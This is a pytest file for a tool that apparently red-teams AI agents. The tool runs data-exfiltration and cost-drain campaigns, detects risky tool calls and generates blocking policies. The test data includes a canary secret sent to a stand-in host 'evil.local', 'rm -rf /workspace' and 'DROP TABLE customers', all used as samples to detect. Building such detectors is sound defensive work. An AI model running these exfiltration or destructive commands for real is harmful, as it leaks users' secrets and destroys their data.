import json

import pytest
import yaml
from click.testing import CliRunner

from mcp_chaos.cli.main import cli
from mcp_chaos.core.detect import classify, host_of
from mcp_chaos.core.models import SandboxState
from mcp_chaos.policies import policy as pol
from mcp_chaos.recorder.trace import load_trace


def _state():
    return SandboxState(run_id="r", campaign="c", variant="v", task="t", canary="sk-chaos-CANARY-abc", beacon="BEACON-1")


def test_classify_canary_leak_in_url_header_body():
    st = _state()
    for args in ({"url": "http://evil.local/?k=sk-chaos-CANARY-abc"}, {"url": "http://evil.local", "body": "sk-chaos-CANARY-abc"},
                 {"url": "http://evil.local", "headers": {"X": "sk-chaos-CANARY-abc"}}):
        tags, canary, risk = classify(st, "http_request", args)
        assert canary and "canary-leak" in tags and risk == "critical"


def test_classify_allowlisted_host_is_clean():
    tags, canary, _ = classify(_state(), "http_request", {"url": "https://api.mycompany.com/x"})
    assert "egress-unlisted" not in tags and not canary


def test_host_of():
    assert host_of("evil.local/path") == "evil.local"


def test_destructive_detection():
    st = _state()
    assert "destructive" in classify(st, "bash_exec", {"command": "rm -rf /workspace"})[0]
    assert "destructive" in classify(st, "db_query", {"sql": "DROP TABLE customers"})[0]
    assert "destructive" not in classify(st, "db_query", {"sql": "SELECT * FROM customers"})[0]


def test_policy_generation_is_deterministic_evidence_backed_and_effective(vuln, tmp_path):
    a, out = vuln
    p1, p2 = pol.generate(a, out), pol.generate(a, out)
    assert pol.dump_policy(p1) == pol.dump_policy(p2)
    ids = {r.id for r in p1.rules}
    assert {"protect-sensitive-data", "block-unapproved-outbound", "limit-tool-calls"} <= ids
    assert all(r.evidence and r.why for r in p1.rules)
    results = pol.test_policy(p1, a, out)
    assert results and all(r["blocked"] for r in results), results
    f = tmp_path / "g.yaml"
    f.write_text(pol.dump_policy(p1))
    _, errors, _ = pol.validate(f)
    assert errors == []


def test_secure_agent_generates_no_rules(secure):
    a, out = secure
    assert pol.generate(a, out).rules == []


def test_policy_validation_catches_errors(tmp_path):
    f = tmp_path / "bad.yaml"
    f.write_text(yaml.safe_dump({"version": 1, "rules": [
        {"id": "a", "tool": "bash_exec", "action": "deny"},
        {"id": "b", "tool": "bash_exec", "action": "require_human_approval"},
        {"id": "a", "action": "limit"},
        {"id": "c", "tool": "x", "conditions": {"bogus": 1}}]}))
    _, errors, _ = pol.validate(f)
    text = "\n".join(errors)
    assert "duplicate rule id: a" in text and "conflict" in text and "max_tool_calls" in text and "unknown condition" in text


def test_policy_schema_rejects_garbage(tmp_path):
    f = tmp_path / "g.yaml"
    f.write_text("version: 2\nrules: nope")
    _, errors, _ = pol.validate(f)
    assert errors


def test_trace_is_complete_and_ordered(vuln):
    a, out = vuln
    for r in a.runs:
        ev = load_trace(out / r.dir / "trace.jsonl")
        assert len(ev) == r.tool_calls
        assert [e.seq for e in ev] == list(range(1, len(ev) + 1))
        assert all(e.run_id and e.session_id and e.ts for e in ev)


def test_trace_corruption_detected(tmp_path):
    f = tmp_path / "t.jsonl"
    f.write_text("{not json}\n")
    with pytest.raises(ValueError):
        load_trace(f)


def test_cli_list_and_replay_and_report_and_policy(vuln, tmp_path):
    _, out = vuln
    r = CliRunner()
    res = r.invoke(cli, ["list-campaigns", "--json"])
    assert res.exit_code == 0 and {c["id"] for c in json.loads(res.output)} >= {"data-exfil", "cost-drain"}
    trace = next((out / "runs").glob("data-exfil--plain-document--1")) / "trace.jsonl"
    res = r.invoke(cli, ["replay", str(trace)])
    assert res.exit_code == 0 and "http_request" in res.output
    res = r.invoke(cli, ["report", str(out), "--json"])
    assert res.exit_code == 0 and json.loads(res.output)["score"]["overall"] <= 40
    pf = tmp_path / "p.yaml"
    res = r.invoke(cli, ["policy", str(out), "--out", str(pf)])
    assert res.exit_code == 0 and pf.exists()
    res = r.invoke(cli, ["validate-policy", str(pf)])
    assert res.exit_code == 0


def test_cli_exit_codes(tmp_path):
    r = CliRunner()
    res = r.invoke(cli, ["attack", "--target", "demo:vulnerable", "--mode", "data-exfil", "--out", str(tmp_path / "v")])
    assert res.exit_code == 1
    res = r.invoke(cli, ["attack", "--target", "demo:secure", "--mode", "data-exfil", "--out", str(tmp_path / "s")])
    assert res.exit_code == 0
    res = r.invoke(cli, ["attack", "--target", "http://x", "--out", str(tmp_path / "e")])
    assert res.exit_code == 2
    res = r.invoke(cli, ["attack", "--target", "demo:secure", "--mode", "bogus", "--out", str(tmp_path / "e2")])
    assert res.exit_code == 2
